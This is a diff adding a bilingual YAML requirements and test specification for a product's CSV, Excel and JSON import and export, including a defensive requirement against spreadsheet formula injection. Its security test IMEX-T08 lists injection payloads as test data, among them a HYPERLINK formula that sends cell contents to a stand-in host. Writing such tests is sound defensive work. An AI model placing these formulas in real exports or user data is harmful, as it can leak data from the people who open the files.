@@ -1,0 +1,493 @@
+area: import-export
+prefix: IMEX
+group: functional
+name: {en: Import and export, sv: Import och export}
+description:
+  en: Import from CSV, Excel and JSON with a validation report, column mapping, character encoding, large files, export of all data and lossless round trips.
+  sv: Import från CSV, Excel och JSON med valideringsrapport, kolumnmappning, teckenkodning, omfattande filer, export av all data och förlustfri rundtur.
+
+requirements:
+  - id: IMEX-01
+    type: interface
+    obligation: must
+    priority: high
+    tags: [import, csv, excel, json]
+    refs: ["RFC 4180", "ECMA-376 Office Open XML", "RFC 8259"]
+    tests: [IMEX-T01]
+    en:
+      title: Import from CSV, Excel and JSON
+      description: The system MUST import items from CSV files as defined in RFC 4180, from Excel files in .xlsx format and from JSON files that follow the published import schema.
+      rationale: Teams move data from spreadsheets and other tools, and these three formats cover the common sources.
+      criteria:
+        - method: test
+          text: The same 20 items in each of the three formats are imported with identical results.
+    sv:
+      title: Import från CSV, Excel och JSON
+      description: Systemet SKA importera objekt från CSV-filer enligt RFC 4180, från Excelfiler i formatet .xlsx och från JSON-filer som följer det publicerade importschemat.
+      rationale: Team flyttar data från kalkylark och andra verktyg, och dessa tre format täcker de vanliga källorna.
+      criteria:
+        - method: test
+          text: Samma 20 objekt i vart och ett av de tre formaten importeras med identiskt resultat.
+
+  - id: IMEX-02
+    type: functional
+    obligation: must
+    priority: critical
+    tags: [import, validation, report]
+    refs: ["ISO 9241-110:2020 use error robustness", "ISO/IEC 25012:2008 accuracy"]
+    tests: [IMEX-T02]
+    en:
+      title: Validation report before data is written
+      description: The system MUST validate every row of an import file and show a report with row number, column and reason for each error before it writes any data.
+      rationale: Users fix their source file in one pass instead of discovering errors after a partial import.
+      criteria:
+        - method: test
+          text: A file with errors in rows 3, 7 and 12 produces a report that lists exactly those rows with column and reason, and no item is created.
+    sv:
+      title: Valideringsrapport innan data skrivs
+      description: Systemet SKA validera varje rad i en importfil och visa en rapport med radnummer, kolumn och orsak för varje fel innan det skriver någon data.
+      rationale: Användare rättar sin källfil i ett svep i stället för att upptäcka fel efter en delvis genomförd import.
+      criteria:
+        - method: test
+          text: En fil med fel på rad 3, 7 och 12 ger en rapport som listar exakt de raderna med kolumn och orsak, och inget objekt skapas.
+
+  - id: IMEX-03
+    type: functional
+    obligation: should
+    priority: medium
+    tags: [import, transactions]
+    refs: ["ISO/IEC 25010:2023 integrity"]
+    tests: [IMEX-T02]
+    en:
+      title: No partial import without consent
+      description: The system SHOULD write no row of a file with validation errors until the user has explicitly chosen to import only the valid rows.
+      rationale: A silent partial import leaves the data set in a state the user did not expect.
+      criteria:
+        - method: test
+          text: A file with 2 invalid rows of 20 imports nothing until the user confirms, and then imports exactly the 18 valid rows.
+    sv:
+      title: Ingen delvis import utan samtycke
+      description: Systemet BÖR vänta med att skriva rader från en fil med valideringsfel tills användaren uttryckligen har valt att bara importera de giltiga raderna.
+      rationale: En tyst delvis import lämnar datamängden i ett läge som användaren inte räknade med.
+      criteria:
+        - method: test
+          text: En fil med 2 ogiltiga rader av 20 importerar ingenting förrän användaren bekräftar, och därefter exakt de 18 giltiga raderna.
+
+  - id: IMEX-04
+    type: usability
+    obligation: should
+    priority: medium
+    tags: [import, column-mapping]
+    refs: ["ISO 9241-110:2020 suitability for the user's tasks"]
+    tests: [IMEX-T03]
+    en:
+      title: Column mapping with remembered choices
+      description: The import SHOULD let the user map each file column to a field and propose the mapping used in the user's previous import with the same column headings.
+      rationale: Source files rarely use the product's field names, and recurring imports have the same layout.
+      criteria:
+        - method: test
+          text: The user maps 5 columns once, and a second file with the same headings is proposed with the same mapping.
+    sv:
+      title: Kolumnmappning som kommer ihåg valen
+      description: Importen BÖR låta användaren koppla varje kolumn i filen till ett fält och föreslå den mappning som användes vid användarens föregående import med samma kolumnrubriker.
+      rationale: Källfiler använder sällan produktens fältnamn, och återkommande importer har samma upplägg.
+      criteria:
+        - method: test
+          text: Användaren mappar 5 kolumner en gång, och för en andra fil med samma rubriker föreslås samma mappning.
+
+  - id: IMEX-05
+    type: interface
+    obligation: must
+    priority: high
+    tags: [import, encoding, utf-8]
+    refs: ["RFC 3629", "RFC 4180 §3", "The Unicode Standard §23.8"]
+    tests: [IMEX-T04]
+    en:
+      title: CSV import in UTF-8 with or without byte order mark
+      description: The system MUST read CSV import files encoded in UTF-8 both with and without a byte order mark and detect comma and semicolon as the separator.
+      rationale: Spreadsheet programs in Swedish and other European locales save CSV with semicolons and a byte order mark.
+      criteria:
+        - method: test
+          text: Files with å, ä, ö and emoji in all four combinations of byte order mark and separator are imported with identical text.
+    sv:
+      title: CSV-import i UTF-8 med eller utan byteordningsmarkering
+      description: Systemet SKA läsa CSV-filer för import som är kodade i UTF-8 både med och utan byteordningsmarkering och identifiera kommatecken och semikolon som avgränsare.
+      rationale: Kalkylprogram med svenska och andra europeiska inställningar sparar CSV med semikolon och byteordningsmarkering.
+      criteria:
+        - method: test
+          text: Filer med å, ä, ö och emojier i alla fyra kombinationer av byteordningsmarkering och avgränsare importeras med identisk text.
+
+  - id: IMEX-06
+    type: interface
+    obligation: must
+    priority: medium
+    tags: [export, encoding, csv]
+    refs: ["RFC 4180", "RFC 3629"]
+    tests: [IMEX-T04]
+    en:
+      title: CSV export that opens correctly in spreadsheets
+      description: The system MUST write CSV exports in UTF-8 with a byte order mark and quote each field that contains the separator, a quotation mark or a line break.
+      rationale: Without a byte order mark spreadsheet programs show "Ã¥" instead of "å", and unquoted separators shift columns.
+      criteria:
+        - method: test
+          text: An export with å, ä, ö, commas, quotation marks and line breaks in text fields opens in a spreadsheet program with every value in the correct cell.
+    sv:
+      title: CSV-export som öppnas korrekt i kalkylprogram
+      description: Systemet SKA skriva CSV-exporter i UTF-8 med byteordningsmarkering och citera varje fält som innehåller avgränsaren, ett citattecken eller en radbrytning.
+      rationale: Utan byteordningsmarkering visar kalkylprogram "Ã¥" i stället för "å", och ociterade avgränsare förskjuter kolumnerna.
+      criteria:
+        - method: test
+          text: En export med å, ä, ö, kommatecken, citattecken och radbrytningar i textfält öppnas i ett kalkylprogram med varje värde i rätt cell.
+
+  - id: IMEX-07
+    type: regulatory
+    obligation: must
+    priority: high
+    tags: [export, data-portability, gdpr]
+    refs: ["GDPR Art. 20", "ISO/IEC 25010:2023 interoperability", "ISO/IEC 19941:2017"]
+    tests: [IMEX-T05]
+    en:
+      title: Export of all organisation data
+      description: The system MUST let an administrator export all data of the organisation, including attachments and history, as JSON files in one ZIP archive.
+      rationale: Customers need their data to change supplier, to archive it and to exercise data portability.
+      criteria:
+        - method: test
+          text: The archive contains every item, relation, history entry and attachment of the organisation, and the item counts equal those shown in the system.
+    sv:
+      title: Export av all data i organisationen
+      description: Systemet SKA låta en administratör exportera all data i organisationen, inklusive bilagor och historik, som JSON-filer i ett ZIP-arkiv.
+      rationale: Kunder behöver sina data för att byta leverantör, för att arkivera och för att utöva rätten till dataportabilitet.
+      criteria:
+        - method: test
+          text: Arkivet innehåller varje objekt, relation, historikpost och bilaga i organisationen, och antalet objekt stämmer med det som visas i systemet.
+
+  - id: IMEX-08
+    type: functional
+    obligation: should
+    priority: medium
+    tags: [export, list]
+    refs: ["ISO 9241-110:2020 suitability for the user's tasks"]
+    tests: [IMEX-T05]
+    en:
+      title: Export of the current list view
+      description: The system SHOULD export the current list with its active filters, sort order and visible columns to CSV and Excel.
+      rationale: Users export what they see in order to share it or analyse it further in a spreadsheet.
+      criteria:
+        - method: test
+          text: An export of a filtered and sorted list with 4 visible columns contains exactly the listed items, in the same order, with those 4 columns.
+    sv:
+      title: Export av aktuell listvy
+      description: Systemet BÖR exportera den aktuella listan med dess aktiva filter, sorteringsordning och synliga kolumner till CSV och Excel.
+      rationale: Användare exporterar det de ser för att dela det eller analysera det vidare i ett kalkylark.
+      criteria:
+        - method: test
+          text: En export av en filtrerad och sorterad lista med 4 synliga kolumner innehåller exakt de listade objekten, i samma ordning, med de 4 kolumnerna.
+
+  - id: IMEX-09
+    type: performance
+    obligation: must
+    priority: high
+    tags: [import, large-files, performance]
+    refs: ["ISO/IEC 25010:2023 capacity", "ISO/IEC 25010:2023 time behaviour"]
+    tests: [IMEX-T06]
+    en:
+      title: Import of files with 100 000 rows
+      description: The system MUST import a file of 100 000 rows and 50 MB within 5 minutes as a background job that shows its progress.
+      rationale: Migrations from other tools involve whole data sets, and a request that times out leaves the import in an unknown state.
+      criteria:
+        - method: test
+          text: The test file is imported completely in at most 5 minutes, the progress is shown during the job and the user can keep working meanwhile.
+          threshold: "100 000 rows / 50 MB in ≤ 5 min"
+    sv:
+      title: Import av filer med 100 000 rader
+      description: Systemet SKA importera en fil med 100 000 rader och 50 MB inom 5 minuter som ett bakgrundsjobb som visar sitt förlopp.
+      rationale: Flyttar från andra verktyg omfattar hela datamängder, och ett anrop som tar för lång tid lämnar importen i ett okänt läge.
+      criteria:
+        - method: test
+          text: Testfilen importeras helt på högst 5 minuter, förloppet visas under jobbet och användaren kan arbeta vidare under tiden.
+          threshold: "100 000 rader / 50 MB på ≤ 5 min"
+
+  - id: IMEX-10
+    type: functional
+    obligation: must
+    priority: high
+    tags: [round-trip, export, import]
+    refs: ["ISO/IEC 25010:2023 interoperability"]
+    tests: [IMEX-T07]
+    en:
+      title: Lossless export and import round trip
+      description: Re-importing a JSON export into an empty organisation MUST recreate every item with identical field values, relations and identifiers.
+      rationale: A lossless round trip proves that exports are complete and lets customers move data between installations.
+      criteria:
+        - method: test
+          text: A field-by-field comparison of the original and the re-imported organisation finds no difference apart from internal database keys.
+    sv:
+      title: Förlustfri rundtur med export och import
+      description: Import av en JSON-export till en tom organisation SKA återskapa varje objekt med identiska fältvärden, relationer och identiteter.
+      rationale: En förlustfri rundtur visar att exporterna är kompletta och gör det möjligt för kunder att flytta data mellan installationer.
+      criteria:
+        - method: test
+          text: En jämförelse fält för fält mellan den ursprungliga och den återimporterade organisationen hittar inga skillnader, bortsett från interna databasnycklar.
+
+  - id: IMEX-11
+    type: security
+    obligation: must_not
+    priority: high
+    tags: [export, csv-injection]
+    refs: ["OWASP CSV Injection", "CWE-1236"]
+    tests: [IMEX-T08]
+    en:
+      title: No formula injection in exports
+      description: CSV and Excel exports MUST NOT contain a cell value that starts with "=", "+", "-", "@", a tab or a carriage return without a leading apostrophe.
+      rationale: A spreadsheet program executes such values as formulas, which an attacker can use to run commands or leak data.
+      criteria:
+        - method: test
+          text: Items whose titles start with each of the six characters are exported with a leading apostrophe and open as text in a spreadsheet program.
+    sv:
+      title: Ingen formelinjektion i exporter
+      description: Exporter till CSV och Excel SKA INTE innehålla ett cellvärde som börjar med "=", "+", "-", "@", tabb eller vagnretur utan en inledande apostrof.
+      rationale: Kalkylprogram kör sådana värden som formler, vilket en angripare kan använda för att köra kommandon eller läcka data.
+      criteria:
+        - method: test
+          text: Objekt vars titlar börjar med vart och ett av de sex tecknen exporteras med en inledande apostrof och öppnas som text i ett kalkylprogram.
+
+tests:
+  - id: IMEX-T01
+    priority: high
+    execution: automated
+    tags: [import, formats]
+    refs: ["RFC 4180", "RFC 8259"]
+    en:
+      title: Same data imported from CSV, Excel and JSON
+      description: An integration test imports one data set in three formats into three empty projects and compares the results.
+      preconditions: Three empty projects and the same 20 items as a CSV file, an .xlsx file and a JSON file.
+      expected: All three projects contain the same 20 items with identical values.
+      steps:
+        - action: Import items.csv into project 1, items.xlsx into project 2 and items.json into project 3.
+          expected: Each import reports 20 created items and no errors.
+          data: items.csv, items.xlsx, items.json
+        - action: Read all items from the three projects and compare them field by field.
+          expected: The items are identical in all three projects apart from their project.
+    sv:
+      title: Samma data importerat från CSV, Excel och JSON
+      description: Ett integrationstest importerar en datamängd i tre format till tre tomma projekt och jämför resultaten.
+      preconditions: Tre tomma projekt och samma 20 objekt som en CSV-fil, en .xlsx-fil och en JSON-fil.
+      expected: Alla tre projekten innehåller samma 20 objekt med identiska värden.
+      steps:
+        - action: Importera items.csv till projekt 1, items.xlsx till projekt 2 och items.json till projekt 3.
+          expected: Varje import rapporterar 20 skapade objekt och inga fel.
+          data: items.csv, items.xlsx, items.json
+        - action: Läs alla objekt från de tre projekten och jämför dem fält för fält.
+          expected: Objekten är identiska i alla tre projekten bortsett från vilket projekt de tillhör.
+
+  - id: IMEX-T02
+    priority: critical
+    execution: manual
+    tags: [import, validation]
+    refs: ["ISO 9241-110:2020 use error robustness"]
+    en:
+      title: Validation report and choice to import valid rows
+      description: Checks the validation report for a file with errors and that nothing is written before the user decides.
+      preconditions: An empty project and a CSV file of 20 rows with an empty mandatory title in row 3, an invalid date in row 7 and an unknown status in row 12.
+      expected: The report lists the three errors, nothing is imported before confirmation and only valid rows are imported after it.
+      steps:
+        - action: Upload the file and start the import.
+          expected: A report lists row 3 (title, empty), row 7 (due date, invalid date) and row 12 (status, unknown value).
+          data: "rows 3, 7, 12"
+        - action: Open the project in another tab without confirming.
+          expected: The project is still empty.
+        - action: Choose to import only the valid rows and confirm.
+          expected: 17 items are created and the report states that 3 rows were skipped.
+    sv:
+      title: Valideringsrapport och val att importera giltiga rader
+      description: Kontrollerar valideringsrapporten för en fil med fel och att inget skrivs innan användaren har bestämt sig.
+      preconditions: Ett tomt projekt och en CSV-fil med 20 rader med tom tvingande titel på rad 3, ogiltigt datum på rad 7 och okänd status på rad 12.
+      expected: Rapporten listar de tre felen, inget importeras före bekräftelsen och bara giltiga rader importeras efter den.
+      steps:
+        - action: Ladda upp filen och starta importen.
+          expected: En rapport listar rad 3 (titel, tom), rad 7 (förfallodatum, ogiltigt datum) och rad 12 (status, okänt värde).
+          data: "rad 3, 7, 12"
+        - action: Öppna projektet i en annan flik utan att bekräfta.
+          expected: Projektet är fortfarande tomt.
+        - action: Välj att bara importera de giltiga raderna och bekräfta.
+          expected: 17 objekt skapas och rapporten anger att 3 rader hoppades över.
+
+  - id: IMEX-T03
+    priority: medium
+    execution: manual
+    tags: [import, column-mapping]
+    refs: ["ISO 9241-110:2020 suitability for the user's tasks"]
+    en:
+      title: Column mapping is proposed for a repeated import
+      description: Checks manual column mapping and the proposal of the previous mapping for a file with the same headings.
+      preconditions: Two CSV files with the headings Rubrik, Beskrivning, Ansvarig, Status and Datum and different rows.
+      expected: The mapping from the first import is proposed for the second file.
+      steps:
+        - action: Import the first file and map the 5 columns to title, description, owner, status and due date.
+          expected: The import succeeds with the chosen mapping.
+          data: "Rubrik→title, Beskrivning→description, Ansvarig→owner, Status→status, Datum→due date"
+        - action: Start an import of the second file.
+          expected: The same mapping is proposed and can be changed before the import.
+    sv:
+      title: Kolumnmappning föreslås vid upprepad import
+      description: Kontrollerar manuell kolumnmappning och förslaget med föregående mappning för en fil med samma rubriker.
+      preconditions: Två CSV-filer med rubrikerna Rubrik, Beskrivning, Ansvarig, Status och Datum och olika rader.
+      expected: Mappningen från den första importen föreslås för den andra filen.
+      steps:
+        - action: Importera den första filen och koppla de 5 kolumnerna till titel, beskrivning, ägare, status och förfallodatum.
+          expected: Importen lyckas med den valda mappningen.
+          data: "Rubrik→titel, Beskrivning→beskrivning, Ansvarig→ägare, Status→status, Datum→förfallodatum"
+        - action: Starta en import av den andra filen.
+          expected: Samma mappning föreslås och kan ändras före importen.
+
+  - id: IMEX-T04
+    priority: high
+    execution: automated
+    tags: [encoding, csv, utf-8]
+    refs: ["RFC 4180", "RFC 3629"]
+    en:
+      title: CSV encoding and quoting on import and export
+      description: An integration test imports CSV variants and checks the bytes and quoting of a CSV export.
+      preconditions: Four CSV files with the same rows containing "Åsa Öberg", "Ärende; delvis klart" and an emoji, with and without byte order mark and with comma and semicolon separators.
+      expected: All four variants import identically, and the export starts with a byte order mark and quotes fields correctly.
+      steps:
+        - action: Import each of the four files into its own empty project.
+          expected: Each project contains the same text values byte for byte.
+          data: "BOM+comma, BOM+semicolon, comma, semicolon"
+        - action: Export one project to CSV and read the first bytes of the file.
+          expected: The file starts with the bytes EF BB BF.
+        - action: Parse the exported file with an RFC 4180 parser.
+          expected: Values with separators, quotation marks and line breaks are quoted and every row has the same number of columns.
+    sv:
+      title: Teckenkodning och citering i CSV vid import och export
+      description: Ett integrationstest importerar varianter av CSV och kontrollerar byte och citering i en CSV-export.
+      preconditions: Fyra CSV-filer med samma rader som innehåller "Åsa Öberg", "Ärende; delvis klart" och en emoji, med och utan byteordningsmarkering och med kommatecken och semikolon som avgränsare.
+      expected: Alla fyra varianterna importeras identiskt, och exporten börjar med byteordningsmarkering och citerar fält korrekt.
+      steps:
+        - action: Importera var och en av de fyra filerna till ett eget tomt projekt.
+          expected: Varje projekt innehåller samma textvärden byte för byte.
+          data: "BOM+komma, BOM+semikolon, komma, semikolon"
+        - action: Exportera ett projekt till CSV och läs de första byten i filen.
+          expected: Filen börjar med byten EF BB BF.
+        - action: Tolka den exporterade filen med en tolk för RFC 4180.
+          expected: Värden med avgränsare, citattecken och radbrytningar är citerade och varje rad har samma antal kolumner.
+
+  - id: IMEX-T05
+    priority: high
+    execution: manual
+    tags: [export, data-portability]
+    refs: ["GDPR Art. 20"]
+    en:
+      title: Full data export and export of the current view
+      description: Checks the administrator's export of all data and a user's export of a filtered list.
+      preconditions: An organisation with at least 2 projects, items with attachments and history, and an administrator.
+      expected: The full archive is complete and the list export matches the view.
+      steps:
+        - action: As administrator, start the full export and download the ZIP archive.
+          expected: The archive contains JSON files for items, relations and history and a folder with all attachments.
+        - action: Compare the number of items and attachments in the archive with the counts shown in the system.
+          expected: The counts are equal.
+        - action: As a user, filter a list, sort it, show 4 columns and export it to Excel.
+          expected: The file contains exactly the listed items in the same order with the 4 columns.
+    sv:
+      title: Fullständig dataexport och export av aktuell vy
+      description: Kontrollerar administratörens export av all data och en användares export av en filtrerad lista.
+      preconditions: En organisation med minst 2 projekt, objekt med bilagor och historik samt en administratör.
+      expected: Det fullständiga arkivet är komplett och listexporten motsvarar vyn.
+      steps:
+        - action: Starta som administratör den fullständiga exporten och ladda ner ZIP-arkivet.
+          expected: Arkivet innehåller JSON-filer för objekt, relationer och historik och en mapp med alla bilagor.
+        - action: Jämför antalet objekt och bilagor i arkivet med antalen som visas i systemet.
+          expected: Antalen är lika.
+        - action: Filtrera som användare en lista, sortera den, visa 4 kolumner och exportera den till Excel.
+          expected: Filen innehåller exakt de listade objekten i samma ordning med de 4 kolumnerna.
+
+  - id: IMEX-T06
+    priority: high
+    execution: automated
+    tags: [import, large-files, performance]
+    refs: ["ISO/IEC 25010:2023 capacity"]
+    en:
+      title: Import of a file with 100 000 rows
+      description: A performance test imports a generated file of 100 000 rows and measures time and responsiveness.
+      preconditions: A production-like environment and a generated CSV file with 100 000 valid rows and a size of about 50 MB.
+      expected: The import completes within 5 minutes as a background job while the system stays responsive.
+      steps:
+        - action: Upload the file and start the import, recording the start time.
+          expected: The request returns within 5 seconds with a job identifier.
+          data: "100 000 rows, 50 MB"
+        - action: Poll the job status every 10 seconds and run a list request in parallel each time.
+          expected: The job reports increasing progress, and each list request answers within 2 seconds.
+        - action: Record the completion time and count the imported items.
+          expected: The job finishes within 5 minutes and 100 000 items exist.
+    sv:
+      title: Import av en fil med 100 000 rader
+      description: Ett prestandatest importerar en genererad fil med 100 000 rader och mäter tid och svarsförmåga.
+      preconditions: En produktionslik miljö och en genererad CSV-fil med 100 000 giltiga rader och en storlek på omkring 50 MB.
+      expected: Importen blir klar inom 5 minuter som ett bakgrundsjobb medan systemet fortsätter att svara.
+      steps:
+        - action: Ladda upp filen och starta importen och notera starttiden.
+          expected: Anropet returnerar inom 5 sekunder med en jobbidentitet.
+          data: "100 000 rader, 50 MB"
+        - action: Hämta jobbets status var tionde sekund och kör samtidigt ett listanrop varje gång.
+          expected: Jobbet rapporterar ökande förlopp och varje listanrop svarar inom 2 sekunder.
+        - action: Notera sluttiden och räkna de importerade objekten.
+          expected: Jobbet blir klart inom 5 minuter och 100 000 objekt finns.
+
+  - id: IMEX-T07
+    priority: high
+    execution: automated
+    tags: [round-trip]
+    refs: ["ISO/IEC 25010:2023 interoperability"]
+    en:
+      title: Export and re-import round trip
+      description: An integration test exports a seeded organisation to JSON, imports it into an empty organisation and compares both.
+      preconditions: A seeded organisation with items of every type, relations, history, attachments and texts in several scripts.
+      expected: The re-imported organisation is identical to the original apart from internal database keys.
+      steps:
+        - action: Export the seeded organisation to a JSON archive.
+          expected: The export completes without errors.
+        - action: Import the archive into a new, empty organisation.
+          expected: The import reports the same number of items as the export.
+        - action: Compare both organisations field by field, including relations and identifiers.
+          expected: No difference is found apart from internal database keys.
+    sv:
+      title: Rundtur med export och återimport
+      description: Ett integrationstest exporterar en organisation med testdata till JSON, importerar den till en tom organisation och jämför båda.
+      preconditions: En organisation med testdata som har objekt av varje typ, relationer, historik, bilagor och texter i olika skriftsystem.
+      expected: Den återimporterade organisationen är identisk med originalet bortsett från interna databasnycklar.
+      steps:
+        - action: Exportera organisationen med testdata till ett JSON-arkiv.
+          expected: Exporten blir klar utan fel.
+        - action: Importera arkivet till en ny, tom organisation.
+          expected: Importen rapporterar samma antal objekt som exporten.
+        - action: Jämför båda organisationerna fält för fält, inklusive relationer och identiteter.
+          expected: Inga skillnader hittas bortsett från interna databasnycklar.
+
+  - id: IMEX-T08
+    priority: high
+    execution: automated
+    tags: [csv-injection, security]
+    refs: ["OWASP CSV Injection", "CWE-1236"]
+    en:
+      title: Formula characters neutralised in exports
+      description: A security test exports items whose titles start with formula characters and inspects the exported cells.
+      preconditions: Six items whose titles start with "=", "+", "-", "@", a tab and a carriage return.
+      expected: Every such cell is prefixed with an apostrophe in the CSV and stored as text in the Excel file.
+      steps:
+        - action: Export the six items to CSV and read the title cells.
+          expected: Each title starts with an apostrophe followed by the original text.
+          data: '=HYPERLINK("http://example.test?x="&A1), +SUM(1), -1+1, @cmd, \tTab, \rCR'
+        - action: Export the same items to Excel and read the cell types.
+          expected: Each title cell has the type text and contains no formula.
+    sv:
+      title: Formeltecken oskadliggörs i exporter
+      description: Ett säkerhetstest exporterar objekt vars titlar börjar med formeltecken och granskar de exporterade cellerna.
+      preconditions: Sex objekt vars titlar börjar med "=", "+", "-", "@", tabb och vagnretur.
+      expected: Varje sådan cell inleds med en apostrof i CSV-filen och lagras som text i Excelfilen.
+      steps:
+        - action: Exportera de sex objekten till CSV och läs titelcellerna.
+          expected: Varje titel börjar med en apostrof följd av originaltexten.
+          data: '=HYPERLINK("http://example.test?x="&A1), +SUM(1), -1+1, @cmd, \tTab, \rCR'
+        - action: Exportera samma objekt till Excel och läs celltyperna.
+          expected: Varje titelcell har typen text och innehåller ingen formel.
